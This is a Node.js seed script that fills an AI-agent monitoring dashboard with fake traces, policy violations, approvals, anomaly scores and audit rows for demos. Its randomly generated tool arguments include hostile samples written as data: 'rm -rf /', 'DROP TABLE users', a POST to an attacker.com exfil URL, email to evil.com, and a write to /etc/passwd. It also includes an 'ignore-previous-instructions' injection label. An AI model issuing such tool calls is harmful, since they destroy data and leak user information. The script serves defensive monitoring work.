#!/usr/bin/env node
/**
 * Demo seed for the AEGIS cockpit.
 *
 * Walks a freshly-bootstrapped gateway DB and inserts a believable mix
 * of orgs / agents / traces / violations / approvals / anomalies /
 * audit-log rows so the cockpit looks ALIVE in screenshots, demos, and
 * design-partner first-touch sessions.
 *
 * Idempotent — re-running it adds more recent rows but doesn't dup the
 * seed agents (uses ON CONFLICT). Safe to invoke from a CI pre-deploy
 * step too.
 *
 * Usage:
 *   node scripts/seed-demo.mjs [--db ./path/to/aegis.db] [--days 7]
 *
 * Defaults: DB at $DB_PATH or ./data/aegis.db; spreads rows across the
 * last 7 days so the dashboard's "by hour" / "by day" panels light up.
 */
import Database from 'better-sqlite3';
import { randomUUID, createHash } from 'node:crypto';
import { existsSync } from 'node:fs';

// ── CLI ──────────────────────────────────────────────────────────────
const args = process.argv.slice(2);
function arg(name, dflt) {
  const i = args.indexOf(`--${name}`);
  return i >= 0 ? args[i + 1] : dflt;
}
const DB_PATH = arg('db', process.env.DB_PATH ?? './data/aegis.db');
const DAYS    = Number(arg('days', '7'));

if (!existsSync(DB_PATH)) {
  console.error(`[seed] DB not found at ${DB_PATH} — start the gateway once to bootstrap it`);
  process.exit(1);
}
const db = new Database(DB_PATH);

// ── Demo data ────────────────────────────────────────────────────────
const ORG_ID  = 'demo-acme';
const ORG_NAME = 'Acme Robotics';
const ENV     = 'PRODUCTION';
const VERSION = '1.0.0';

const AGENTS = [
  { id: 'agent-customer-support', name: 'Customer Support Copilot' },
  { id: 'agent-data-pipeline',    name: 'Data Pipeline Operator'   },
  { id: 'agent-security-triage',  name: 'Security Triage Bot'      },
  { id: 'agent-coding-asst',      name: 'Coding Assistant'         },
];

const TOOLS = [
  { name: 'web_search',  category: 'read-only',    risk: 'LOW' },
  { name: 'db_query',    category: 'database',     risk: 'MEDIUM' },
  { name: 'send_email',  category: 'communication',risk: 'MEDIUM' },
  { name: 'http_post',   category: 'network',      risk: 'HIGH' },
  { name: 'shell',       category: 'shell',        risk: 'CRITICAL' },
  { name: 'file_write',  category: 'file',         risk: 'HIGH' },
];

const POLICY_VIOLATIONS = [
  { policy_id: 'sql-injection',    violation_type: 'DROP TABLE detected in arguments' },
  { policy_id: 'file-access',      violation_type: 'path traversal: /etc/passwd' },
  { policy_id: 'network-access',   violation_type: 'plaintext http:// outbound' },
  { policy_id: 'prompt-injection', violation_type: 'ignore-previous-instructions' },
  { policy_id: 'data-exfiltration',violation_type: 'PII to external domain' },
];

// ── Helpers ──────────────────────────────────────────────────────────
function ago(daysBack, hoursJitter = 24) {
  const d = new Date();
  d.setHours(d.getHours() - daysBack * 24 - Math.floor(Math.random() * hoursJitter));
  return d.toISOString();
}
function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function chance(p) { return Math.random() < p; }

// ── Seed ─────────────────────────────────────────────────────────────
try {
  // Try insert an org if the org table exists. Don't crash on schemas
  // that don't have one yet.
  try {
    db.prepare(`INSERT OR IGNORE INTO organizations (id, name, slug, plan) VALUES (?, ?, ?, 'pro')`)
      .run(ORG_ID, ORG_NAME, 'acme-robotics');
  } catch { /* table may not exist on minimal deploys */ }

  // Agents (api_keys + agents table)
  try {
    const insertAgent = db.prepare(
      `INSERT OR IGNORE INTO api_keys (agent_id, key_hash, status) VALUES (?, ?, 'ACTIVE')`,
    );
    for (const a of AGENTS) {
      const fakeHash = createHash('sha256').update(`demo:${a.id}`).digest('hex');
      insertAgent.run(a.id, fakeHash);
    }
  } catch { /* schema varies */ }

  // Traces — 50 rows over the last DAYS days
  const traceStmt = db.prepare(`
    INSERT INTO traces (
      trace_id, agent_id, timestamp, sequence_number,
      input_context, thought_chain, tool_call, observation,
      integrity_hash, environment, version, tags
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  let traceCount = 0;
  for (let i = 0; i < 50; i++) {
    const ag = pick(AGENTS);
    const tool = pick(TOOLS);
    const ts = ago(Math.random() * DAYS);
    const traceId = randomUUID();
    const args = tool.name === 'shell'    ? { command: chance(0.2) ? 'rm -rf /' : 'ls -la' }
              : tool.name === 'db_query' ? { sql: chance(0.15) ? 'DROP TABLE users' : 'SELECT 1' }
              : tool.name === 'http_post' ? { url: chance(0.3) ? 'http://attacker.com/exfil' : 'https://api.example.com/v1/data' }
              : tool.name === 'send_email' ? { to: chance(0.2) ? 'attacker@evil.com' : 'colleague@example.com', subject: 'follow-up', body: 'hi' }
              : tool.name === 'web_search' ? { q: 'top python ML libs' }
              : tool.name === 'file_write' ? { path: chance(0.15) ? '/etc/passwd' : '/home/user/notes.md' }
              : {};
    try {
      traceStmt.run(
        traceId, ag.id, ts, i,
        JSON.stringify({ user_prompt: 'demo prompt #' + i }),
        '',
        JSON.stringify({ tool_name: tool.name, arguments: args }),
        JSON.stringify({ raw_output: 'ok' }),
        createHash('sha256').update(traceId).digest('hex'),
        ENV, VERSION,
        JSON.stringify({ env: 'demo' }),
      );
      traceCount++;
    } catch {}
  }

  // Violations — ~30% of traces fail a policy
  const violationStmt = db.prepare(`
    INSERT INTO violations (agent_id, policy_id, trace_id, violation_type, details, created_at)
    VALUES (?, ?, ?, ?, ?, ?)
  `);
  let violationCount = 0;
  const traceIds = db.prepare(`SELECT trace_id, agent_id FROM traces ORDER BY RANDOM() LIMIT 20`).all();
  for (const t of traceIds) {
    if (!chance(0.6)) continue;
    const v = pick(POLICY_VIOLATIONS);
    try {
      violationStmt.run(t.agent_id, v.policy_id, t.trace_id, v.violation_type, null, ago(Math.random() * DAYS));
      violationCount++;
    } catch {}
  }

  // Approvals — a few PENDING for the dashboard's review queue
  const approvalStmt = db.prepare(`
    INSERT OR IGNORE INTO approvals
      (id, trace_id, agent_id, tool_name, risk_level, status, created_at, expires_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
  `);
  let approvalCount = 0;
  const recentTraces = db.prepare(`SELECT trace_id, agent_id FROM traces ORDER BY timestamp DESC LIMIT 8`).all();
  for (const t of recentTraces) {
    try {
      const id = randomUUID();
      const expires = new Date(Date.now() + 3600_000).toISOString();
      approvalStmt.run(id, t.trace_id, t.agent_id, pick(TOOLS).name, pick(['MEDIUM', 'HIGH']), 'PENDING', new Date().toISOString(), expires);
      approvalCount++;
    } catch {}
  }

  // Anomaly events — Layer 2 detector output
  const anomalyStmt = db.prepare(`
    INSERT INTO anomaly_events (agent_id, trace_id, check_id, composite_score, decision, signals, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `);
  let anomalyCount = 0;
  for (const t of traceIds.slice(0, 10)) {
    const score = 0.4 + Math.random() * 0.6;
    const decision = score > 0.85 ? 'block' : score > 0.6 ? 'escalate' : 'allow';
    try {
      anomalyStmt.run(t.agent_id, t.trace_id, null, score, decision,
        JSON.stringify([
          { name: 'mahalanobis', value: Math.random() },
          { name: 'isolation_forest', value: Math.random() },
        ]), ago(Math.random() * DAYS));
      anomalyCount++;
    } catch {}
  }

  // Admin audit log — policy changes + key actions
  const auditStmt = db.prepare(`
    INSERT INTO admin_audit_log (org_id, user_id, user_email, action, resource_type, resource_id, details, ip_address, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);
  let auditCount = 0;
  const auditEvents = [
    { action: 'policy.create', resource_type: 'policy', resource_id: 'no-shell',   details: '{"risk":"HIGH"}' },
    { action: 'policy.update', resource_type: 'policy', resource_id: 'sql-injection', details: '{"pattern_changed":true}' },
    { action: 'policy.delete', resource_type: 'policy', resource_id: 'legacy-rule', details: null },
    { action: 'apikey.revoke',  resource_type: 'apikey', resource_id: 'agent-old',   details: '{"reason":"rotation"}' },
    { action: 'killswitch.revoke', resource_type: 'agent', resource_id: 'agent-coding-asst', details: '{"reason":"anomaly threshold breached"}' },
    { action: 'judge.batch',    resource_type: 'judge',  resource_id: null,         details: '{"judged":42}' },
  ];
  for (const e of auditEvents) {
    try {
      auditStmt.run(ORG_ID, 'demo-admin', 'admin@acme.example', e.action, e.resource_type, e.resource_id, e.details, '203.0.113.10', ago(Math.random() * DAYS));
      auditCount++;
    } catch {}
  }

  console.log(`[seed] ✓ ${traceCount} traces, ${violationCount} violations, ${approvalCount} pending approvals, ${anomalyCount} anomalies, ${auditCount} audit rows`);
  console.log(`[seed] ✓ cockpit at http://localhost:13001 should now show data`);
} finally {
  db.close();
}
